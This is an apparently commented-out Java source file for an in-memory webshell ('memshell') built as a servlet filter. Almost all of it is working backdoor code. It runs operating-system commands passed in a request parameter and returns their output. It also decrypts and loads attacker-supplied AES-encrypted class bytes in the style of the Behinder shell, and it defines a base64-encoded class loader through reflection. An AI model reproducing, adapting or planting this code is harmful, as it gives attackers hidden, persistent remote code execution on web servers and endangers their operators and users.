//package com.memshell.generic;
//
//import sun.misc.BASE64Decoder;
//import javax.crypto.Cipher;
//import javax.crypto.spec.SecretKeySpec;
//import javax.servlet.*;
//import javax.servlet.http.HttpServletRequest;
//import java.io.File;
//import java.io.IOException;
//import java.lang.reflect.InvocationTargetException;
//import java.lang.reflect.Method;
//import java.util.Scanner;
//
//public class DynamicFilterTemplate implements Filter {
//
//    private Class myClassLoaderClazz;
//
//    public DynamicFilterTemplate(){
//        super();
//        initialize();
//    }
//
//    @Override
//    public void init(FilterConfig filterConfig) throws ServletException {
//
//    }
//
//    @Override
//    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
//        System.out.println("[+] Dynamic Filter says hello");
//
//
//        if(servletRequest.getParameter("type") != null && servletRequest.getParameter("type").equals("basic")){
//            //basic cmd shell
//            String cmd = servletRequest.getParameter(Config.getPassword());
//            if(cmd != null && !cmd.isEmpty()){
//                String[] cmds = null;
//                if(File.separator.equals("/")){
//                    cmds = new String[]{"/bin/sh", "-c", cmd};
//                }else{
//                    cmds = new String[]{"cmd", "/C", cmd};
//                }
//                String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
//                servletResponse.getWriter().println(result);
//            }
//        }else if(((HttpServletRequest)servletRequest).getHeader(Config.getHeader()) != null){
//            //behind3 shell
//            try{
//                if (((HttpServletRequest)servletRequest).getMethod().equals("POST")){
//                    String k = Config.getBehinderShellPwdPwd();
//                    ((HttpServletRequest)servletRequest).getSession().setAttribute("u",k);
//                    Cipher cipher = Cipher.getInstance("AES");
//                    cipher.init(2, new SecretKeySpec((((HttpServletRequest)servletRequest).getSession().getAttribute("u") + "").getBytes(), "AES"));
//                    byte[] evilClassBytes = cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(servletRequest.getReader().readLine()));
//                    Class evilClass = (Class) myClassLoaderClazz.getDeclaredMethod("defineClass", byte[].class, ClassLoader.class).invoke(null, evilClassBytes, Thread.currentThread().getContextClassLoader());
//                    Object evilObject = evilClass.newInstance();
//                    Method targetMethod = evilClass.getDeclaredMethod("equals", new Class[]{ServletRequest.class, ServletResponse.class});
//                    targetMethod.invoke(evilObject, new Object[]{servletRequest, servletResponse});
//                }
//            }catch(Exception e){
//                e.printStackTrace();
//            }
//        }else{
//            filterChain.doFilter(servletRequest, servletResponse);
//        }
//    }
//
//    @Override
//    public void destroy() {
//
//    }
//
//    private void initialize(){
//        try{
//            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
//            try{
//                this.myClassLoaderClazz = classLoader.loadClass("com.memshell.generic.MyClassLoader");
//            } catch (ClassNotFoundException e) {
//                Class clazz = classLoader.getClass();
//                Method method = null;
//                while(method == null && clazz != Object.class){
//                    try{
//                        method = clazz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
//                    }catch(NoSuchMethodException ex){
//                        clazz = clazz.getSuperclass();
//                    }
//                }
//
//                String code = "yv66vgAAADIAGwoABQAWBwAXCgACABYKAAIAGAcAGQEABjxpbml0PgEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACRMY29tL21lbXNoZWxsL2dlbmVyaWMvTXlDbGFzc0xvYWRlcjsBAAFjAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAtkZWZpbmVDbGFzcwEALChbQkxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KUxqYXZhL2xhbmcvQ2xhc3M7AQAFYnl0ZXMBAAJbQgEAC2NsYXNzTG9hZGVyAQAKU291cmNlRmlsZQEAEk15Q2xhc3NMb2FkZXIuamF2YQwABgAHAQAiY29tL21lbXNoZWxsL2dlbmVyaWMvTXlDbGFzc0xvYWRlcgwADwAaAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQACAAUAAAAAAAIAAAAGAAcAAQAIAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAJAAAABgABAAAABAAKAAAAFgACAAAABgALAAwAAAAAAAYADQAOAAEACQAPABAAAQAIAAAARAAEAAIAAAAQuwACWSu3AAMqAyq+tgAEsAAAAAIACQAAAAYAAQAAAAgACgAAABYAAgAAABAAEQASAAAAAAAQABMADgABAAEAFAAAAAIAFQ==";
//                byte[] bytes = new BASE64Decoder().decodeBuffer(code);
//                method.setAccessible(true);
//                this.myClassLoaderClazz = (Class) method.invoke(classLoader, bytes, 0, bytes.length);
//            }
//        } catch (IllegalAccessException e) {
//            e.printStackTrace();
//        } catch (IOException e) {
//            e.printStackTrace();
//        } catch (InvocationTargetException e) {
//            e.printStackTrace();
//        }
//    }
//}
